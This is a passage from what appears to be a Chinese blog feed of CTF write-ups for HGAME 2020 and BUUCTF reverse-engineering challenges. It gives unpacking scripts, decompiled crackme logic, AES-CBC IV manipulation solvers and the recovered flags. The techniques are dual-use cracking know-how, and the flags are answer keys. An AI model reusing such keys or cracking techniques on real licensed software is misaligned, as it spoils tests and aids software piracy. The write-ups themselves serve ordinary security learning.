     &#39;G&#39;: &#39;--.&#39;, &#39;H&#39;: &#39;....&#39;, &#39;I&#39;: &#39;..&#39;,        &#39;J&#39;: &#39;.---&#39;, &#39;K&#39;: &#39;-.-&#39;, &#39;L&#39;: &#39;.-..&#39;,        &#39;M&#39;: &#39;--&#39;, &#39;N&#39;: &#39;-.&#39;, &#39;O&#39;: &#39;---&#39;,        &#39;P&#39;: &#39;.--.&#39;, &#39;Q&#39;: &#39;--.-&#39;, &#39;R&#39;: &#39;.-.&#39;,        &#39;S&#39;: &#39;...&#39;, &#39;T&#39;: &#39;-&#39;, &#39;U&#39;: &#39;..-&#39;,        &#39;V&#39;: &#39;...-&#39;, &#39;W&#39;: &#39;.--&#39;, &#39;X&#39;: &#39;-..-&#39;,        &#39;Y&#39;: &#39;-.--&#39;, &#39;Z&#39;: &#39;--..&#39;,        &#39;0&#39;: &#39;-----&#39;, &#39;1&#39;: &#39;.----&#39;, &#39;2&#39;: &#39;..---&#39;,        &#39;3&#39;: &#39;...--&#39;, &#39;4&#39;: &#39;....-&#39;, &#39;5&#39;: &#39;.....&#39;,        &#39;6&#39;: &#39;-....&#39;, &#39;7&#39;: &#39;--...&#39;, &#39;8&#39;: &#39;---..&#39;,        &#39;9&#39;: &#39;----.&#39;,        &#39;.&#39;: &#39;.-.-.-&#39;, &#39;:&#39;: &#39;---...&#39;, &#39;,&#39;: &#39;--..--&#39;, &#39;;&#39;: &#39;-.-.-.&#39;,        &#39;?&#39;: &#39;..--..&#39;, &#39;=&#39;: &#39;-...-&#39;, &#39;\&#39;&#39;: &#39;.----.&#39;, &#39;/&#39;: &#39;-..-.&#39;,        &#39;!&#39;: &#39;-.-.--&#39;, &#39;-&#39;: &#39;-....-&#39;, &#39;_&#39;: &#39;..--.-&#39;, &#39;&quot;&#39;: &#39;.-..-.&#39;,        &#39;(&#39;: &#39;-.--.&#39;, &#39;)&#39;: &#39;-.--.-&#39;, &#39;$&#39;: &#39;...-..-&#39;, &#39;&amp;&#39;: &#39;.-...&#39;,        &#39;@&#39;: &#39;.--.-.&#39;        }def Decode(str):    Decode_value = CODE.keys()    Decode_key = CODE.values()    Decode_dict = dict(zip(Decode_key, Decode_value))    text = &#39;&#39;    msg = str.split(&#39; &#39;)    for s in msg:        if s in Decode_dict.keys():            text += Decode_dict[s]    return textprint(Decode(&#39;.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--&#39;))</code></pre><p>这里还有符号的摩斯电码，大部分的在线解码都没有，所以自己写了一个，解码出来补上hgame：</p><pre><code class="flag">hgame{W3LC0ME_TO_2020_HGAM3}</code></pre><h4 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h4><p>下载解压，是张图片，自然想到隐写，binwalk跑出来，发现是个压缩包，打开压缩包，发现需要密码，密码是这张照片在P站的ID，P站未知原因打不开，上B站找到了ID：76953815</p><p>解压出来打开flag.txt，内容如下：</p><pre><code>\u68\u67\u61\u6d\u65\u7b\u44\u6f\u5f\u79\u30\u75\u5f\u4b\u6e\u4f\u57\u5f\u75\u4e\u69\u43\u30\u64\u33\u3f\u7d</code></pre><p>unicode编码，解码得：</p><pre><code class="flag">hgame{Do_y0u_KnOW_uNiC0d3?}</code></pre><h4 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h4><p>压缩包打开，有一个密码提示和一个新的压缩包，Password.txt得内容如下：</p><pre><code>Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y   h jnsxf qjFjf jnb  rg fiyykwtbsnkm tm  xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.JRFVJYFZVRUAGMAI* Three fences first, Five Caesar next. English sentense first,  zip password next.</code></pre><p>根据提示，把上面的内容用3个字符得栅栏密码和5个字符得凯撒密码解密，得到一段英文和压缩包的密码</p><pre><code>Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice.EAVMUBAQHQMVEPDT</code></pre><p>解压出来得到一个新的txt文件，里面是莫名其妙的Ook语言,用在线工具翻译为text，得到一段base32编码大的字符串，base32解密之后得到了又一串编码过的字符，试一试base64，发现解码出来的内容有很多乱码，不过是PNG开头，应该是base64转图片，写个python脚本解码，得到一个二维码，扫码得到flag</p><pre><code class="flag">hgame{3Nc0dInG_@lL_iN_0Ne!}</code></pre><p>这题有各种各样的编码，还不错</p><h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="RE-1"><a href="#RE-1" class="headerlink" title="RE"></a>RE</h3><h4 id="unpack"><a href="#unpack" class="headerlink" title="unpack"></a>unpack</h4><p>明显upx脱壳，但是经过了万恶的出题人修改，不能用工具，只能手动脱壳<br>由于是linux可执行文件，PE常用的工具都没法用，只能开虚拟机用IDA远程调试，主要目的还是找到OEP，并且由于是linux程序，还省去了重建输入表的麻烦，直接就可以运行（虽然运不运行并不是很重要，主要是脱壳之后反编译出来）<br>脱壳的过程借鉴<a href="https://www.52pojie.cn/thread-1048649-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1048649-1-1.html</a><br>很少有人对ELF64文件加壳，教程也很少，直接使用里面的idc修改目录导出</p><pre><code class="c++">#include &lt;idc.idc&gt;#define PT_LOAD              1#define PT_DYNAMIC           2static main(void){  auto ImageBase,StartImg,EndImg;  auto e_phoff;  auto e_phnum,p_offset;  auto i,dumpfile;  ImageBase=0x400000;  StartImg=0x400000;  EndImg=0x0;  if (Dword(ImageBase)==0x7f454c46 || Dword(ImageBase)==0x464c457f )  {    if(dumpfile=fopen(&quot;D:\\dumpfile&quot;,&quot;wb&quot;))    {      e_phoff=ImageBase+Qword(ImageBase+0x20);      Message(&quot;e_phoff = 0x%x\n&quot;, e_phoff);      e_phnum=Word(ImageBase+0x38);      Message(&quot;e_phnum = 0x%x\n&quot;, e_phnum);      for(i=0;i&lt;e_phnum;i++)      {         if (Dword(e_phoff)==PT_LOAD || Dword(e_phoff)==PT_DYNAMIC)         {             p_offset=Qword(e_phoff+0x8);            StartImg=Qword(e_phoff+0x10);            EndImg=StartImg+Qword(e_phoff+0x28);            Message(&quot;start = 0x%x, end = 0x%x, offset = 0x%x\n&quot;, StartImg, EndImg, p_offset);            dump(dumpfile,StartImg,EndImg,p_offset);            Message(&quot;dump segment %d ok.\n&quot;,i);         }             e_phoff=e_phoff+0x38;      }      fseek(dumpfile,0x3c,0);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fseek(dumpfile,0x28,0);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fclose(dumpfile);    }else Message(&quot;dump err.&quot;);  }}static dump(dumpfile,startimg,endimg,offset) {  auto i;  auto size;  size=endimg-startimg;  fseek(dumpfile,offset,0);  for ( i=0; i &lt; size; i=i+1 )   {    fputc(Byte(startimg+i),dumpfile);  }}</code></pre><p>尝试在虚拟机里面运行，发现可以运行，代表脱壳成功，反编译，通过提示语找到程序处理输入的部分</p><pre><code class="c++">scanf((__int64)&quot;%42s&quot;, v7);  v5 = 0;  for ( i = 0; i &lt;= 41; ++i )  {    if ( i + v7[i] != (unsigned __int8)byte_6CA0A0[i] )      v5 = 1;  }  if ( v5 == 1 )  {    v0 = &quot;Wrong input&quot;;    printf(&quot;Wrong input&quot;, v7);  }  else  {    v0 = &quot;Congratulations! Flag is your input&quot;;    printf(&quot;Congratulations! Flag is your input&quot;, v7);  }</code></pre><p>本题主要考验手动脱壳的技巧，对于加密部分并没有设置太多的难度，直接导出6CA0A0处的数组然后进行逆变换就得到了flag</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() {    unsigned char ida_chars[] =            {                    0x68, 0x68, 0x63, 0x70, 0x69, 0x80, 0x5B, 0x75, 0x78, 0x49,                    0x6D, 0x76, 0x75, 0x7B, 0x75, 0x6E, 0x41, 0x84, 0x71, 0x65,                    0x44, 0x82, 0x4A, 0x85, 0x8C, 0x82, 0x7D, 0x7A, 0x82, 0x4D,                    0x90, 0x7E, 0x92, 0x54, 0x98, 0x88, 0x96, 0x98, 0x57, 0x95,                    0x8F, 0xA6            };    string flag;    for(int i=0;i&lt;42;i++)        {            flag+=ida_chars[i]-i;        }    cout&lt;&lt;flag&lt;&lt;endl;    return 0;}</code></pre><p>最后输出flag</p><pre><code>hgame{Unp@cking_1s_R0m4ntic_f0r_r3vers1ng}</code></pre><h4 id="Classic-CrackMe"><a href="#Classic-CrackMe" class="headerlink" title="Classic_CrackMe"></a>Classic_CrackMe</h4><p>PEiD查看一下，没壳，编写语言是Microsoft Visual C# / Basic .NET，C#逆向没有难度，</p><p>dnSpy打开就和源码几乎没什么区别，这题显然难度不在这，反编译之后找到按键click事件，关键代码就在这里</p><pre><code class="c#">private void button1_Click(object sender, EventArgs e)        {            if (this.status == 1)            {                MessageBox.Show(&quot;你已经激活成功啦，快去提交flag吧~~~&quot;);                return;            }            string text = this.textBox1.Text;            if (text.Length != 46 || text.IndexOf(&quot;hgame{&quot;) != 0 || text.IndexOf(&quot;}&quot;) != 45)            {                MessageBox.Show(&quot;Illegal format&quot;);                return;            }            string base64iv = text.Substring(6, 24);            string str = text.Substring(30, 15);            try            {                Aes aes = new Aes(&quot;SGc0bTNfMm8yMF9XZWVLMg==&quot;, base64iv);                Aes aes2 = new Aes(&quot;SGc0bTNfMm8yMF9XZWVLMg==&quot;, &quot;MFB1T2g5SWxYMDU0SWN0cw==&quot;);                string text2 = aes.DecryptFromBase64String(&quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;);                if (text2.Equals(&quot;Same_ciphertext_&quot;))                {                    byte[] array = new byte[16];                    Array.Copy(aes2.EncryptToByte(text2 + str), 16, array, 0, 16);                    if (Convert.ToBase64String(array).Equals(&quot;dJntSWSPWbWocAq4yjBP5Q==&quot;))                    {                        MessageBox.Show(&quot;注册成功！&quot;);                        this.Text = &quot;已激活，欢迎使用！&quot;;                        this.status = 1;                    }                    else                    {                        MessageBox.Show(&quot;注册失败！\nhint: &quot; + aes2.DecryptFromBase64String(&quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;));                    }                }                else                {                    MessageBox.Show(&quot;注册失败！\nhint: &quot; + aes2.DecryptFromBase64String(&quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;));                }            }            catch            {                MessageBox.Show(&quot;注册失败！&quot;);            }        }</code></pre><p>发现最终考察的还是aes的cbc模式，我们输入的flag被掐头去尾分成了两部分，前一部分作为第一个aes实例的base64iv，第二段作为第二个实例的明文后半段，具体原理可以百度。</p><p>对于第一部分，每个key解密一组密文的结果是一样的只是iv不同，明文不同，所以只需要另找一组iv，求出这个解密之后的结果（解密出来的明文 xor FakeIV），然后在异或我们已知的明文就可以得到结果</p><p>对于第二部分，根据原理我们知道，后面的部分并不影响前面的加密结果，所以直接把一致的明文加密，然后再和已知的密文合并在一起，得到整体的一个密文，然后解密出来的后半部分就是我们需要的字符串。</p><p>不过这里需要注意几点，注意输入输出的数据类型，并且对于第二部分的处理要记得填充字符，因为第二部分只有15位，要填充到16位才能运算，一开始这里没注意，花了好长时间结果还是错的。</p><p>直接python解决：</p><pre><code class="python">from Crypto.Cipher import AESimport base64# 传入的key和iv都是bytes类型，加密输出的是经过base64编码之后的密文，解密传入的也是base64编码过后的密文class AesCrypter(object):    def __init__(self, key, iv):        self.key = key        self.iv = iv    def pkcs7padding(self, text):        bs = AES.block_size  # 16        length = len(text)        bytes_length = len(bytes(text, encoding=&#39;utf-8&#39;))        padding_size = length if (bytes_length == length) else bytes_length        padding = bs - padding_size % bs        padding_text = chr(padding) * padding        return text + padding_text    def pkcs7unpadding(self, text):        length = len(text)        unpadding = ord(text[length - 1])        return text[0:length - unpadding]    def encrypt(self, content):        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)        content_padding = self.pkcs7padding(content)        aes_encode_bytes = cipher.encrypt(bytes(content_padding, encoding=&#39;utf-8&#39;))        result = base64.b64encode(aes_encode_bytes).decode(encoding=&#39;utf-8&#39;)        return result    def decrypt(self, content):        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)        # base64解码        aes_encode_bytes = base64.b64decode(content)        # 解密        aes_decode_bytes = cipher.decrypt(aes_encode_bytes)        # 重新编码        result = aes_decode_bytes.decode(encoding=&#39;utf-8&#39;)        # 去除填充内容        result = self.pkcs7unpadding(result)        if result == None:            return &quot;&quot;        else:            return resultkey = base64.b64decode(&quot;SGc0bTNfMm8yMF9XZWVLMg==&quot;)fakeIV = base64.b64decode(&#39;MFB1T2g5SWxYMDU0SWN0cw==&#39;)plainText = &quot;Same_ciphertext_&quot;ciperText = &quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;aesCipher = AesCrypter(key, fakeIV)fakePlainText = aesCipher.decrypt(ciperText)# print(fakePlainText)IV = &#39;&#39;for i in range(16):    IV += chr(ord(fakePlainText[i]) ^ fakeIV[i] ^ ord(plainText[i]))# print(&quot;IV : &quot; + IV)# /TyXYzPnY;$)\we_IV = base64.b64encode(IV.encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)cipherText2 = aesCipher.encrypt(plainText)cipherText2 = base64.b64decode(cipherText2).hex()[:32]cipherText3 = &#39;dJntSWSPWbWocAq4yjBP5Q==&#39;cipherText3 = base64.b64decode(cipherText3).hex()[:32]# print(cipherText2 + cipherText3)cipherText4 = bytes.fromhex(cipherText2 + cipherText3)cipherText4 = base64.b64encode(cipherText4)# print(cipherText4)plainText3 = aesCipher.decrypt(cipherText4)# print(plainText3)# Same_ciphertext_DiFfer3Nt_w0r1dflag = &#39;&#39;flag += &#39;hgame{&#39; + IV + plainText3[16:] + &#39;}&#39;print(flag)# hgame{L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d}</code></pre><p>最终的flag</p><pre><code>hgame{L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d}</code></pre><h4 id="babyPy"><a href="#babyPy" class="headerlink" title="babyPy"></a>babyPy</h4><p>这题比较简单，把log和dis指令表对照一下就能还原出来函数的原型来</p><p>dis指令表见<a href="https://docs.python.org/3/library/dis.html#python-bytecode-instructions" target="_blank" rel="noopener">https://docs.python.org/3/library/dis.html#python-bytecode-instructions</a></p><p>还原出来的函数原型（想打死命名的人）</p><pre><code class="python">def encrypt(OOo): O0O = OOo[::-1] O0o = list(O0O) for O0 in range(1, len(O0o)):     Oo = O0o[O0-1] ^ O0o[O0]     O0o[O0] = Oo O = bytes(O0o) return O.hex()</code></pre><p>所以只需要反过来异或一遍就可以了</p><pre><code class="python">s = bytes.fromhex(&#39;7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22&#39;)c = list(str)for i in range(len(c) - 1, 0, -1):    c[i] ^= c[i - 1]print(bytes(c[::-1]))</code></pre><p>输出flag</p><pre><code>hgame{sT4cK_1$_sO_e@Sy~~}</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>hgame</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF-re部分题解</title>
    <link href="/2020/01/11/BUUCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <url>/2020/01/11/BUUCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>看到有些大佬在做BUUCTF的题，看了一下，题目很多，但是感觉良莠不齐，并且开始的一些题目有些太简单了，就当是多做些题目了。</p><a id="more"></a><h4 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h4><p>确实非常easy，直接拖进IDA看到flag</p><pre><code class="flag">flag{this_Is_a_EaSyRe}</code></pre><h4 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h4><p>IDA打开，通过字符串窗口找到主程序，整个程序流程很简单</p><pre><code class="c++">for ( j = 0; ; ++j )  {    v8 = j;    v2 = j_strlen(Str2);    if ( v8 &gt; v2 )      break;    if ( Str2[j] == &#39;o&#39; )      Str2[j] = &#39;0&#39;;  }  sub_1400111D1(&quot;input the flag:&quot;);  sub_14001128F(&quot;%20s&quot;, &amp;Str1);  v3 = j_strlen(Str2);  if ( !strncmp(&amp;Str1, Str2, v3) )    sub_1400111D1(&quot;this is the right flag!\n&quot;);  else    sub_1400111D1(&quot;wrong flag\n&quot;);</code></pre><p>只有这一部分有用，str2时内存中的一个字符串，只是将输入的字符串和变换过后的str2进行一个简单的对比，一样则输出正确</p><p>str2的变换就是将所有的o变换成0，str2为‘{hello_world}’，所以flag为</p><pre><code class="flag">flag{hell0_w0rld}</code></pre><h4 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h4><p>和上一题完全一样，只不过时ELF64文件，把i和r全部替换成了1</p><pre><code class="flag">flag{hack1ng_fo1_fun}</code></pre><h4 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h4><p>安卓逆向，直接apktool反编译，在MainActivity.smail文件里找到了flag</p><pre><code class="flag">flag{7631a988259a00816deda84afb29430a}</code></pre><h4 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h4><p>简单加壳软件，在加壳时没做任何的修改，直接upx脱壳，IDA反编译，通过字符串直接找到flag</p><pre><code>flag{HappyNewYear!}</code></pre><h4 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a>内涵的软件</h4><p>IDA反编译可以直接发现flag，把花括号里的放进flag{}里即可</p><pre><code>flag{49d3c93df25caad81232130f3d2ebfad}</code></pre><h4 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h4><p>一看题目就是到要逆运算异或，反编译之后发现关键运算</p><pre><code class="c++">for ( i = 1; i &lt; 33; ++i )    v6[i] ^= v6[i - 1];  v3 = global;  if ( !strncmp(v6, global, 0x21uLL) )    printf(&quot;Success&quot;, v3);</code></pre><p>所以逆运算就好了</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() {    unsigned char ida_chars[] =            {                    0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11,                    0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F,                    0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F,                    0x47, 0x32, 0x4F            };    string flag;    flag+=ida_chars[0];    for(int i=1;i&lt;33;i++)        {            flag+=(ida_chars[i]^ida_chars[i-1]);        }    cout&lt;&lt;flag&lt;&lt;endl;    return 0;}</code></pre><p>直接输出flag</p><pre><code>flag{QianQiuWanDai_YiTongJiangHu}</code></pre><h4 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h4><p>和bugku的love是同一个题，不再赘述</p><h4 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h4><p>比较简单的的迷宫题，上下左右全部都标示的清清楚楚</p><p><img src="https://s2.ax1x.com/2020/02/13/1q9kRI.png" srcset="/img/loading.gif" alt="不一样的flag-1"></p><p>迷宫如下图</p><p><img src="https://s2.ax1x.com/2020/02/13/1q9Azt.png" srcset="/img/loading.gif" alt="不一样的flag-2"></p><pre><code>*11110100001010000101111#</code></pre><p>转换成5*5的方阵，*走到#即可</p><pre><code>flag{222441144222}</code></pre><h4 id="刮开有奖"><a href="#刮开有奖" class="headerlink" title="刮开有奖"></a>刮开有奖</h4><p>IDA反编译出来，发现需要输入8位，经过sub_4010F0这个函数的变换后，在经过两个base64变换（查看函数内部自己发现），满足条件即正确</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpTZF.png" srcset="/img/loading.gif" alt="刮开有奖-1"></p><p>sub_4010F0这个函数内容比较多，但是和输入的字符串无关，所以直接直接把函数实现然后求出来正确的取值就可以了（后面的条件略多，这里的变换实际上只需要第一位和第五位）</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int __cdecl decrypt(char *a1, int a2, int a3) {    int result; // eax    int i; // esi    int v5; // ecx    int v6; // edx    result = a3;    for (i = a2; i &lt;= a3; a2 = i) {        v5 = i;        v6 = a1[i];        if (a2 &lt; result &amp;&amp; i &lt; result) {            do {                if (v6 &gt; a1[result]) {                    if (i &gt;= result)                        break;                    ++i;                    a1[v5] = a1[result];                    if (i &gt;= result)                        break;                    while (a1[result] &lt;= v6) {                        if (++i &gt;= result)                            goto LABEL_13;                    }                    if (i &gt;= result)                        break;                    v5 = i;                    a1[result] = a1[i];                }                --result;            } while (i &lt; result);        }        LABEL_13:        a1[result] = v6;        decrypt(a1, a2, i - 1);        result = a3;        ++i;    }    return result;}char v9[20] = {90, 74, 83, 69, 67, 97, 78, 72, 51, 110, 103};int main() {    cout &lt;&lt; v9 &lt;&lt; endl;    decrypt(v9, 0, 10);    cout &lt;&lt; v9 &lt;&lt; endl;    return 0;}</code></pre><p>输出如图所示</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpIqU.png" srcset="/img/loading.gif" alt="刮开有奖-2"></p><p>接着分析下面的部分</p><pre><code class="c++">if ( String == v9 + 34         // 第一位等于51+34=85--&gt;&#39;U&#39;        &amp;&amp; v21 == v13         //第2位，等于v13,即sub_4010F0函数返回值的第5位值--&gt;&#39;J&#39;        &amp;&amp; 4 * v22 - 141 == 3 * v11        &amp;&amp; v23 / 4 == 2 * (v16 / 9)        &amp;&amp; !strcmp(v6, &quot;ak1w&quot;)       // 第6,7,8个字符base64之后，等于ak1w        &amp;&amp; !strcmp(v7,&quot;V1Ax&quot;)        // 第3,4,5个字符，base64之后等于V1Ax   )      {        MessageBoxA(hDlg, &quot;U g3t 1T!&quot;, &quot;@_@&quot;, 0);      }</code></pre><p>还多了两个条件就检验正确就可以了</p><p>得到flag</p><pre><code>flag{UJWP1jMp}</code></pre><h4 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a>SimpleRev</h4><p>这题没什么难度，IDA打开</p><pre><code class="c++">int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  int v3; // eax  char v4; // [rsp+Fh] [rbp-1h]  while ( 1 )  {    while ( 1 )    {      printf(&quot;Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: &quot;, argv, envp);      v4 = getchar();      if ( v4 != &#39;d&#39; &amp;&amp; v4 != &#39;D&#39; )        break;      Decry();    }    if ( v4 == &#39;q&#39; || v4 == &#39;Q&#39; )      Exit();    puts(&quot;Input fault format!&quot;);    v3 = getchar();    putchar(v3);  }}</code></pre><p>main函数里面没有什么需要注意的东西，解决问题的重点就都放在Decry()这个函数里了</p><pre><code class="c++">unsigned __int64 Decry(){  char v1; // [rsp+Fh] [rbp-51h]  int v2; // [rsp+10h] [rbp-50h]  int v3; // [rsp+14h] [rbp-4Ch]  int i; // [rsp+18h] [rbp-48h]  int v5; // [rsp+1Ch] [rbp-44h]  char src[8]; // [rsp+20h] [rbp-40h]  __int64 v7; // [rsp+28h] [rbp-38h]  int v8; // [rsp+30h] [rbp-30h]  __int64 v9; // [rsp+40h] [rbp-20h]  __int64 v10; // [rsp+48h] [rbp-18h]  int v11; // [rsp+50h] [rbp-10h]  unsigned __int64 v12; // [rsp+58h] [rbp-8h]  v12 = __readfsqword(0x28u);  *(_QWORD *)src = &#39;SLCDN&#39;;  v7 = 0LL;  v8 = 0;  v9 = &#39;wodah&#39;;  v10 = 0LL;  v11 = 0;  text = join(key3, (const char *)&amp;v9);         // text=killshadow  strcpy(key, key1);                            // key=key1=&#39;ADSFK&#39;  strcat(key, src);                             // key=&#39;ADSFKNDCLS&#39;  v2 = 0;  v3 = 0;  getchar();  v5 = strlen(key);  for ( i = 0; i &lt; v5; ++i )  {    if ( key[v3 % v5] &gt; &#39;@&#39; &amp;&amp; key[v3 % v5] &lt;= &#39;Z&#39; )      key[i] = key[v3 % v5] + 32;    ++v3;  }                                             // 转换为小写                                                // key=&#39;adsfkndcls&#39;  printf(&quot;Please input your flag:&quot;, src);  while ( 1 )  {    v1 = getchar();    if ( v1 == &#39;\n&#39; )                           // 遇到回车结束      break;    if ( v1 == &#39; &#39; )                            // 跳过空格    {      ++v2;    }    else    {      if ( v1 &lt;= 96 || v1 &gt; 122 )      {        if ( v1 &gt; 64 &amp;&amp; v1 &lt;= 90 )              // 大写字母          str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97;      }      else                                      // 小写字母      {        str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97;      }      if ( !(v3 % v5) )        putchar(32);      ++v2;    }  }  if ( !strcmp(text, str2) )    puts(&quot;Congratulation!\n&quot;);  else    puts(&quot;Try again!\n&quot;);  return __readfsqword(0x28u) ^ v12;}</code></pre><p>需要注意src和v9本身是以long long类型赋值，转换成字符串要记得逆序，接下来的过程就很简单了，程序的过程很清楚，直接逆向运算就可以算出来结果了</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main(void) {    int n = 0, v5 = 10, v3 = 10, v2 = 0;    char v1;    char flag[11] = {0};    char key[] = &quot;adsfkndcls&quot;;    char text[] = &quot;killshadow&quot;;//通过放缩，j只能取0-3之间    for (int j = 0; j &lt; 4; ++j) {        for (v2 = 0; v2 &lt; 10; ++v2) {            v1 = text[v2] - 97 + 26 * j - 97 + key[v3++ % v5] + 39;            if ((v1 &gt;= 65 &amp;&amp; v1 &lt;= 90) || (v1 &gt;= 97 &amp;&amp; v1 &lt;= 122)) {                flag[v2] = v1;                if (++n == 10) {                    printf(&quot;flag{%s}\n&quot;, flag);                    return 0;                }            }        }    }    return 0;}</code></pre><p>这里的j是用来逆向取余运算时候遍历，放缩之后得到一个范围，然后计算就可以了</p><pre><code>flag{KLDQCUDFZO}</code></pre><h4 id="Java逆向解密"><a href="#Java逆向解密" class="headerlink" title="Java逆向解密"></a>Java逆向解密</h4><p>第一次做Java逆向，顺便也熟悉熟悉Java，所以逆向程序也是用Java写的</p><p>附件打开是class文件，IDEA直接可以反编译，反编译出来的代码很简单</p><pre><code class="java">import java.util.ArrayList;import java.util.Scanner;public class Reverse {    public Reverse() {    }    public static void main(String[] args) {        Scanner s = new Scanner(System.in);        System.out.println(&quot;Please input the flag ：&quot;);        String str = s.next();        System.out.println(&quot;Your input is ：&quot;);        System.out.println(str);        char[] stringArr = str.toCharArray();        Encrypt(stringArr);    }    public static void Encrypt(char[] arr) {        ArrayList&lt;Integer&gt; Resultlist = new ArrayList();        for(int i = 0; i &lt; arr.length; ++i) {            int result = arr[i] + 64 ^ 32;            Resultlist.add(result);        }        int[] KEY = new int[]{180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65};        ArrayList&lt;Integer&gt; KEYList = new ArrayList();        for(int j = 0; j &lt; KEY.length; ++j) {            KEYList.add(KEY[j]);        }        System.out.println(&quot;Result:&quot;);        if (Resultlist.equals(KEYList)) {            System.out.println(&quot;Congratulations！&quot;);        } else {            System.err.println(&quot;Error！&quot;);        }    }}</code></pre><p>把KEY每个值都减去64^32就好了，没什么难度，所以试试用Java写，练练手</p><pre><code class="java">package com.company;import java.util.ArrayList;public class Main {    public static void main(String[] args) {        int[] KEY = new int[]{180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65};        ArrayList&lt;Integer&gt; resultList = new ArrayList&lt;&gt;();        for (int value : KEY) {            resultList.add(value - 64 ^ 32);        }//        System.out.println(resultList);        StringBuilder s = new StringBuilder();        for (int value:resultList){            s.append((char)value);        }        System.out.println(&quot;flag{&quot;+s+&quot;}&quot;);    }}</code></pre><p>直接输出flag</p><pre><code>flag{This_is_the_flag_!}</code></pre><h4 id="findit"><a href="#findit" class="headerlink" title="findit"></a>findit</h4><p>不管是apktool反编译还是直接cfr反编译到代码，都可以找到一串很像flag的字符数组</p><pre><code>pvkq{m164675262033l4m49lnp7p9mnk28k75}</code></pre><p>直接凯撒密码解密，a与k之间相差10，所以key=10</p><pre><code>flag{c164675262033b4c49bdf7f9cda28a75}</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>BUUCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bugku-re部分题解</title>
    <link href="/2020/01/11/bugku-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <url>/2020/01/11/bugku-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    
